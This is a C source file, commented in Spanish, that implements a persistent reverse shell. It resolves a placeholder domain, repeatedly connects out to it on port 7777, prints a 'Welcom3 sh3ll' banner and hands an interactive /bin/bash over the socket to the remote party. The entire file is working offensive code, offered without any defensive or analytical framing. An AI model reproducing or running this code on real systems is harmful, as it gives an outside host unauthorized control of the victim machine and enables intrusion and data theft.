#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define DOMINIO "nombredominio.cl"
#define NPUERTA 7777

int main(){ 

    int socket_info;
    int conectar;
    int pid;
    int i;
    char *ip;
    struct sockaddr_in socketdst;
    struct hostent *host_info;
    struct in_addr **host_name;

    while(1){ // loop de conexion

	if ( (host_info = gethostbyname( DOMINIO ) ) == NULL) 
    {
        // no pudo resolver dominio
        herror("gethostbyname");
        return 1;
    }

    host_name = (struct in_addr **) host_info->h_addr_list;
     
    for(i = 0; host_name[i] != NULL; i++) {
        ip = inet_ntoa(*host_name[i]);
        break;
    }

	socket_info = socket(AF_INET, SOCK_STREAM, 0);
    socketdst.sin_family = AF_INET;
    socketdst.sin_port = htons(NPUERTA);
    socketdst.sin_addr.s_addr = inet_addr(ip);
    conectar = connect(socket_info, (struct sockaddr *)&socketdst, sizeof(struct sockaddr));
	
	while(conectar < 0){
		sleep(5);
		conectar = connect(socket_info, (struct sockaddr *)&socketdst, sizeof(struct sockaddr));
    }
    conectar = write(socket_info,"#######################################################\n",60);
    conectar = write(socket_info,"#################### Welcom3 sh3ll ####################\n",60);
    conectar = write(socket_info,"#######################################################\n\n\\$ ",60);
    
    
    pid = fork();
    if(pid > 0){
		wait(NULL);
	}
	if(pid == 0){
		// enviando shell
		dup2(socket_info,0);
		dup2(socket_info,1);
		dup2(socket_info,2);
		execl("/bin/bash", "/bin/bash", NULL);
	}
    
}
	return 0;

}